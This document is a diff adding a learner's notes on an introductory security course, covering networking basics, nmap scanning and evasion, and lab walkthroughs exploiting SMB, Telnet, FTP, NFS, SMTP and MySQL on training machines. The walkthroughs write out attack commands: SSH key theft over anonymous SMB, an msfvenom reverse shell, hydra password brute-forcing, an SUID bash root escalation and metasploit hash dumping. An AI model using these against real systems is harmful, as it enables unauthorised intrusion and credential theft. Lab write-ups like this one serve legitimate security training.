@@ -1,0 +1,223 @@
+Complete Beginner Intro
+	Tutorial
+		Task 1 - Turn on Computer
+		
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	Starting Out in Infosec
+		Task 1 - Intro
+		Task 2 - Offensive Sec
+		Task 3 - Defensive Sec
+		
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	Introductory Researching
+		Task 1 - Intro
+		Task 2 - Example Research Question
+			Q. How to repeatedly send a captured request in burpsuite?
+				A. Repeater
+			Q. What hash format are Win passwd's stored in?
+				A. NTLM
+			Q. What are Linux automated tasks called?
+				A. Cronjobs
+			Q. What number base could you use as shorthand for base 2?
+				A. Base 16
+			Q. If a password hash starts with $6$, what format is it?
+				A. SHA512crypt
+		Task 3 - Vuln Searching
+			Q. What is the CVE for a XSS WPForms exploit in 2020?
+				A. searchsploit -wo WPForms
+			Q. 2016 CVE for local priv escalation on Debian Apache Tomcat
+				A. searchsploit -wo Apache Tomcat Debian
+			Q. First VLC CVE
+				A. For this I just went to Exploid-DB because searchsploit isn't as good for filtering by date in my opinion.
+			Q. 2020 buffer overflow for Sudo
+				A. Stayed on Exploit-DB and just searched it.
+		Task 4 - Man Pages
+			• Not much here, just reading man pages.
+		Task 5 - Final Thoughts
+	
+====================================================================================================================================
+
+////////////////////////////////////////// LINUX FUNDAMENTALS COMPLETED IN PRE-SECURITY \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\	
+	
+====================================================================================================================================
+
+!!!!!!!!!!!!!! COURSE USES BRITISH SPELLING AND DATE FORMATTING IN ITS ANSWERS !!!!!!!!!!!!!!
+
+Network Exploitation Basics
+	Introductory Networking
+		Task 1 - Intro
+		Task 2 - OSI Model
+			• Anagram for OSI model:
+				Anxious 		|	Application
+				Pale 			|	Presentation
+				Shakespeare 	|	Session
+				Treated 		|	Transport
+				Nervous 		|	Network
+				Drunks 			|	Data Link
+				Patiently		|	Physical
+		Task 3 - Encapsulation
+			• Layer 2 (Data Link) adds a trailer to verify integrity
+		Task 4 - The TCP/IP model
+			• 	OSI 		vs	TCP/IP:
+				Application  \
+				Presentation  >	Application
+				Session		 /
+				Transport	 -- Transport
+				Network		 -- Internet
+				Datalink	 \	Network Interface
+				Physical	 /
+		Task 5 - Ping
+		Task 6 - Traceroute
+		Task 7 - Whois
+			• Not much here, but a modicum of OSINT is always fun
+		Task 8 - Dig
+			• Mostly DNS content, refer to NOTES_3.1 Lines 170-189 (DNS in Detail)
+	
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	nmap
+		Task 1 - Deploy
+		Task 2 - Intro
+		Task 3 - Nmap Switches
+			• Mostly just an overview of the 'nmap -h' page
+		Task 4 - Overview
+		Task 5 - TCP Connect Scans
+			• Firewalls can be configured to respond to a SYN request with a RST packet
+		Task 6 - SYN Scans
+			• "Stealthy" on older servers, as the handshake isn't completed, but picked up by most new IDS solutions 
+		Task 7 - UDP Scans
+			• Slow and difficult to tell if the port is open or filtered
+		Task 8 - NULL, FIN & XMAS
+			• NULL - TCP with no flags
+			• FIN - TCP with FIN flag despite no open connection
+			• XMAS - TCP with URG/PSH/FIN flags
+			• Will get similar results as a UDP scan while potentially evading some firewalls (lack of SYN flag) but most modern IDS would detect
+			• **NOTE** If network isn't following RFC 793 (possible) then all ports will display open due to no-response being the default action
+		Task 9 - ICMP Network Scanning
+			• Can use CIDR notation
+		Task 10 - Overview
+			• NSE is based in LUA language
+			• Categories of NSE scripts:
+				○ Safe - No affect
+				○ Intrusive - Will affect
+				○ Vuln - Scan for vulns
+				○ Exploit - Exploit a vuln
+				○ Auth - Bypass auth
+				○ Brute - Bruteforce creds
+				○ Discovery - Query a service for info
+		Task 11 - Working with the NSE
+			• Can use --script=<script-category> or <script-name> to run scripts
+			• For scripts with args it's --script=<script name> --script-args <arg 1>,<arg 2>,...
+			• --script-help for help
+		Task 12 - Searching for Scripts
+			• WEBSITE 	---		https://nmap.org/nsedoc/
+			• Local scripts - /usr/share/nmap/script (/script.db for a list, this IS greppable, including categories)
+			• If you don't want to grep, then "ls [-l *name*]" is possible too, ensuring to have wildcards on either side of the name
+			• If scripts are manually downloaded, "nmap --script-updatedb" can update the db
+		Task 13 - Firewall Evasion
+			• If ICMP packets are blocked, then the -Pn flag will not bother
+				○ Will make the scan take longer
+			• The -f and --mtu <num> flag fragments packets to make it less detectable, mtu number must be a multiple of 8
+			• --scan-delay <time>ms can be used to delay packets, potentially evading time based firewall/IDS triggers.
+			• --badsum can detect a firewall potentially
+		Task 14 - Practical
+			• Did an XMAS scan of the network, all ports are shown open due to no reponse (Windows network? Cisco devices?)
+				○ nmap -sX -vv -p 0-999 <ip>
+			• Used Wireshark with filter to monitor the scan
+				○ nmap -sS -p 0-4999 -vv <ip>
+				○ tcp.port == 80 and ip.addr == 10.10.86.196
+			• Did a TCP Connect scan on port 80, wireshark packets captured:
+				1. SYN			me > server
+				2. SYN/ACK		server > me
+				3. ACK			me > server
+				4. RST/ACK		me > server
+			• Used ftp-anon to login to a running FTP server, also watched it with wireshark
+				○ nmap -vv -p 21 --script=ftp-anon <ip>
+				○ tcp.port == 21 and ip.addr == <ip>
+				○ It seems like I made two SYN > SYN/ACK > RST cycles and then on the third one instead of RST I sent ACK back and it replied 
+				   with an FTP packet, where I replied with a request for an anonymous user, and a password after requested, then successful login
+		Task 15 - Conclusion
+			• Great resource and always happy to breakout nmap and wireshark
+	
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	Network Services
+		Task 1 - Get Connected
+		Task 2 - Understanding SMB
+		Task 3 - Enumerating SMB
+			• First did an nmap scan followed by an enum4linux scan, the commands are below. I limited the nmap scan to common ports since I'd likely find the smb server there.
+				○ nmap -vv -sS -p 0-1023 <ip>
+				○ enum4linux -a <ip>
+		Task 4 - Exploiting SMB
+			• Using the information in the last step, I used smbclient to connect anonymously to the server
+				○ smbclient //<ip>/profiles -U anonymous -p 445
+			• Here I used the more command to read a file on the server, which led me to authorization keys that I downloaded with smbget back on the Attackbox and used chmod to change perms
+				○ smbget smb://<ip>/profiles/.ssh/id_rsa -u Anonymous
+				○ chmod 600 id_rsa
+			• With the RSA key in hand, I use the username I found from the enumeration to SSH into the system
+				○ ssh -i id_rsa cactus@<ip>
+		Task 5 - Understanding Telnet
+		Task 6 - Enumerating Telnet
+			• Scanned target on all ports with nmap, because I didn't wanna scan multiple times I directed output to a greppable file.
+				○ nmap -vv -A -oG output.txt -p 1-65535 10.10.63.145
+					+ Went and grabbed a coffee during the loooooooooooooong scan...
+				○ Port 8012 had a backdoor on it
+		Task 7 - Exploiting Telnet
+			• Connected to the vulnerable machine
+				○ telnet <ip> 8012
+			• I verify I can execute commands with tcpdump and pinging back to my local machine
+			• I use msfvenom to make a reverse shell
+				○ msfvenom -p cmd/unix/reverse_netcat lhost=<ip> lport=4444 R
+				○ After doing the first command I take the output and paste it into the telnet session to finish the reverse shell.
+		Task 8 - Understanding FTP
+		Task 9 - Enumerating FTP
+			• Did a simple nmap scan and found an FTP server that allows for anonymous login, I logged in and downloaded a file with a possible username
+		Task 10 - Exploiting FTP
+			• With a potential username in hand I use Hydra to bruteforce the (very simple) password, which was password.
+				○ hydra -t 4 -l mike -P /root/Desktop/Tools/wordlists/rockyou.txt -vV 10.10.222.20 ftp
+			• I got the flag by then logging into the FTP server as Mike and downloading ftp.txt
+	
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	Network Services 2
+		Task 1 - Get Connected
+		Task 2 - Understanding NFS
+		Task 3 - Enumerating NFS
+			• Unfortunately another lengthy nmap scan
+			• After the portscan I mount the NFS folder and transfer the ssh keys to my pc, changing perms after.
+			• I can use the key to log into the machine.
+				○ ssh -i /root/Desktop/id_rsa cappucino:<ip>
+		Task 4 - Exploiting NFS
+			• I upload bash executable to the NFS folder and give root ownership of it while changing the SUID perms.
+				○ scp -i id_rsa cappucino@10.10.76.114:/bin/bash ~/Downloads/bash
+			• After that I connect with SSH and run bash, giving myself root access. From here I get the flag.
+		Task 5 - Understanding SMTP
+		Task 6 - Enumerating SMTP
+			• Began with a simple nmap scan, then updated and ran smtp_version exploit from metasploit to find the system mail name and MTA
+			• Armed with that info, I ran the smtp_enum exploit after setting the correct options, it enum'd an admin account
+				○ I made sure to use the top-usernames-shortlist found in the tools folder on the Desktop
+		Task 7 - Exploiting SMTP
+			• First step was bruteforcing an SSH password for the admin account using hydra
+				○ hydra -t 16 -l adminstrator -P /usr/share/wordlists/rockyou.txt -vV <ip> ssh
+				○ CRACKED -- passwd = alejandro
+			• From there it's simply logging in via SSH
+		Task 8 - Understanding MySQL
+		Task 9 - Enumerating MySQL
+			• I'm given the login so that I can focus on MySQL exploits
+				○ root:password
+			• My first scan of common ports came up with nothing so I did another of the next 5000 ports to save time
+				○ MySQL port == 3306
+				○ I was able to log in successfully
+			• I use mysql_sql in metasploit without the SQL setting set, which gives me a version
+				○ I rerun with SQL option set to "show databases" to see the databases
+		Task 10 - Exploiting MySQL
+			• I now use mysql_schemadump in metasploit to dump the contents of the databases
+			• Next is the mysql_hashdump to dump the hashes for user:passwd
+				○ Looking at the users and their hashes I see one I don't have access to, carl
+					+ I use echo to pipe out that info into a file I can then crack (echo <hash> > hash.txt)
+				○ With the hash file, I crack it using johntheripper, simple passwd, doggie
+					+ I use that to long into the machine and get the flag.
+		Task 11 - Further Learning
+			• A fun CTF style module
